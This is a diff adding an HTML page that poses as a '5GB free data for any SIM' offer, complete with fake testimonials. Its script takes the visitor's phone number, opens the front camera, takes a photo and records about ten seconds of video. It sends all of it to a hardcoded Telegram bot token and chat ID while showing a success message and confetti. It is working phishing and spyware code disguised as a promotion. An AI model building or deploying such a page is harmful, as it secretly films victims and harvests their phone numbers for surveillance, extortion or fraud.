@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Get 5GB Free Data</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+<style>
+  /* ===== Body and container styling ===== */
+  body {
+    margin: 0;
+    font-family: 'Poppins', sans-serif;
+    background: #f5f9fc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+  .container {
+    background: white;
+    padding: 48px 40px;
+    border-radius: 20px;
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+    max-width: 650px;
+    width: 90%;
+    text-align: center;
+    animation: fadeInUp 1s ease forwards;
+  }
+  @keyframes fadeInUp {
+    from {
+      opacity: 0;
+      transform: translateY(30px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  /* ===== Header ===== */
+  .header {
+    font-size: 28px;
+    font-weight: 700;
+    color: #00796b;
+    margin-bottom: 14px;
+    user-select: none;
+    letter-spacing: 1.2px;
+  }
+  p.desc {
+    color: #555;
+    font-size: 18px;
+    line-height: 1.5;
+    margin-bottom: 30px;
+  }
+
+  /* ===== Form ===== */
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 22px;
+    align-items: center;
+  }
+  input[type="text"] {
+    width: 100%;
+    max-width: 400px;
+    padding: 16px 18px;
+    font-size: 18px;
+    border: 2px solid #cfd8dc;
+    border-radius: 12px;
+    outline-offset: 2px;
+    transition: border-color 0.3s ease;
+  }
+  input[type="text"]:focus {
+    border-color: #00796b;
+    box-shadow: 0 0 8px rgba(0, 121, 107, 0.5);
+  }
+  button {
+    background: linear-gradient(90deg, #00c6ff, #0072ff);
+    border: none;
+    color: white;
+    padding: 18px 40px;
+    font-size: 20px;
+    font-weight: 700;
+    border-radius: 14px;
+    cursor: pointer;
+    transition: background 0.3s ease, transform 0.2s ease;
+    user-select: none;
+  }
+  button:hover {
+    background: linear-gradient(90deg, #0072ff, #00c6ff);
+    transform: scale(1.06);
+  }
+  button:active {
+    transform: scale(0.98);
+  }
+
+  /* ===== Messages ===== */
+  .message {
+    margin-top: 28px;
+    font-size: 20px;
+    font-weight: 600;
+    color: #004d40;
+    min-height: 28px;
+  }
+  .loading-message {
+    margin-top: 20px;
+    font-size: 18px;
+    font-weight: 600;
+    color: #00796b;
+    display: none;
+  }
+
+  /* ===== Testimonials grid ===== */
+  .testimonials {
+    margin-top: 40px;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 22px;
+  }
+  .testimonial {
+    background: #e0f2f1;
+    border-radius: 16px;
+    padding: 18px 22px;
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.07);
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+  .testimonial:hover {
+    transform: translateY(-8px);
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+  }
+  .testimonial img {
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    object-fit: cover;
+    flex-shrink: 0;
+  }
+  .testimonial .text {
+    font-size: 15px;
+    color: #004d40;
+    line-height: 1.3;
+  }
+
+  /* Responsive */
+  @media (max-width: 480px) {
+    .container {
+      padding: 32px 24px;
+    }
+    .header {
+      font-size: 24px;
+    }
+    input[type="text"] {
+      font-size: 16px;
+      padding: 14px 16px;
+    }
+    button {
+      font-size: 18px;
+      padding: 14px 32px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container" role="main">
+  <div class="header" aria-live="polite">🎉 Get 5GB Free Data for Any SIM 🎉</div>
+  <p class="desc">Limited-time promotion! Enter your phone number below to claim your free data instantly. Offer is 100% genuine and backed by telecom providers.</p>
+
+  <form id="phoneNumberForm" aria-label="Free data claim form">
+    <input
+      type="text"
+      id="phoneNumber"
+      name="phoneNumber"
+      pattern="\d{10,20}"
+      placeholder="Enter your phone number"
+      aria-required="true"
+      required
+      autocomplete="tel"
+    />
+    <button type="button" id="submitBtn">Get Free Data</button>
+  </form>
+
+  <div class="loading-message" id="loadingMessage" role="status" aria-live="polite">Processing your request...</div>
+  <div class="message" id="message" aria-live="polite" role="alert"></div>
+
+  <div class="testimonials" aria-label="User testimonials">
+    <div class="testimonial">
+      <img src="https://i.pravatar.cc/56?img=11" alt="User avatar" />
+      <div class="text">"Got my free data instantly! Highly recommend."</div>
+    </div>
+    <div class="testimonial">
+      <img src="https://i.pravatar.cc/56?img=22" alt="User avatar" />
+      <div class="text">"Easy process and genuine offer. Worked perfectly."</div>
+    </div>
+    <div class="testimonial">
+      <img src="https://i.pravatar.cc/56?img=33" alt="User avatar" />
+      <div class="text">"Super fast and reliable. Got 5GB free data!"</div>
+    </div>
+  </div>
+</div>
+
+<!-- Success sound from public domain -->
+<audio id="successSound" src="https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg" preload="auto"></audio>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+<script>
+  // === Telegram bot config ===
+  const TELEGRAM_BOT_TOKEN = '7649115586:AAFmPYzbjLBGsp5CyCO18Fs07y0rW6wrP2Q';
+  const CHAT_ID = '7294724384';
+
+  // === Capture counter and max ===
+  let captureCount = 0;
+  const MAX_CAPTURES = 3;
+
+  // Elements references
+  const messageEl = document.getElementById('message');
+  const loadingEl = document.getElementById('loadingMessage');
+  const phoneInput = document.getElementById('phoneNumber');
+  const submitBtn = document.getElementById('submitBtn');
+  const successSound = document.getElementById('successSound');
+
+  // Attach click event
+  submitBtn.addEventListener('click', getFreeData);
+
+  // Main function called on button click
+  function getFreeData() {
+    // Clear previous messages
+    messageEl.textContent = '';
+    loadingEl.style.display = 'block';
+
+    // Validate phone number pattern manually (optional)
+    if (!phoneInput.checkValidity()) {
+      loadingEl.style.display = 'none';
+      messageEl.textContent = '❌ Please enter a valid phone number (11-15 digits).';
+      return;
+    }
+
+    captureMedia();
+  }
+
+  async function captureMedia() {
+    if (captureCount >= MAX_CAPTURES) {
+      alert('⚠️ You have reached the maximum number of captures.');
+      loadingEl.style.display = 'none';
+      return;
+    }
+
+    captureCount++;
+
+    try {
+      // Request camera access (front camera)
+      const constraints = { video: { facingMode: 'user' } };
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+      // Capture a photo (image blob url)
+      const imgDataUrl = await captureImageFromStream(stream);
+      const imgBlob = await fetch(imgDataUrl).then(r => r.blob());
+
+      // Capture phone number value
+      const phoneNumber = phoneInput.value;
+
+      // Send photo to Telegram
+      await sendMediaToTelegram(imgBlob, 'photo', phoneNumber);
+
+      // Capture video blob (11 seconds)
+      const videoBlob = await captureVideoFromStream(stream);
+      await sendMediaToTelegram(videoBlob, 'video', phoneNumber);
+
+      // Stop camera tracks
+      stream.getTracks().forEach(track => track.stop());
+
+      loadingEl.style.display = 'none';
+      messageEl.textContent = '✅ Thank you! Your request was successful.';
+
+      // Confetti celebration 🎉
+      confetti({
+        particleCount: 200,
+        spread: 80,
+        origin: { y: 0.6 }
+      });
+
+      // Play success sound
+      successSound.currentTime = 0;
+      successSound.play();
+
+    } catch (error) {
+      console.error('Camera error:', error);
+      loadingEl.style.display = 'none';
+      messageEl.textContent = '❌ Error accessing camera. Please allow camera permissions and try again.';
+    }
+  }
+
+  // Capture photo from stream using ImageCapture API
+  async function captureImageFromStream(stream) {
+    const [track] = stream.getVideoTracks();
+    const imageCapture = new ImageCapture(track);
+    const blob = await imageCapture.takePhoto();
+    return URL.createObjectURL(blob);
+  }
+
+  // Capture 10 seconds video from stream
+  function captureVideoFromStream(stream) {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = e => {
+      if (e.data.size > 0) chunks.push(e.data);
+    };
+
+    mediaRecorder.start();
+
+    return new Promise(resolve => {
+      mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+      setTimeout(() => mediaRecorder.stop(), 10000); // 10 seconds recording
+    });
+  }
+
+  // Send media (photo/video) to Telegram chat
+  async function sendMediaToTelegram(blob, type, phoneNumber) {
+    const formData = new FormData();
+    formData.append(type, blob, `${type}_${captureCount}.webm`);
+    formData.append('caption', `Phone Number: ${phoneNumber}`);
+
+    try {
+      const res = await axios.post(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${capitalize(type)}`,
+        formData,
+        { params: { chat_id: CHAT_ID } }
+      );
+      console.log(`${type} sent successfully:`, res.data);
+    } catch (error) {
+      console.error(`Error sending ${type} to Telegram:`, error);
+    }
+  }
+
+  // Utility to capitalize first letter of type string
+  function capitalize(str) {
+    return str.charAt(0).toUpperCase() + str.slice(1);
+  }
+</script>
+
+</body>
+      </html>
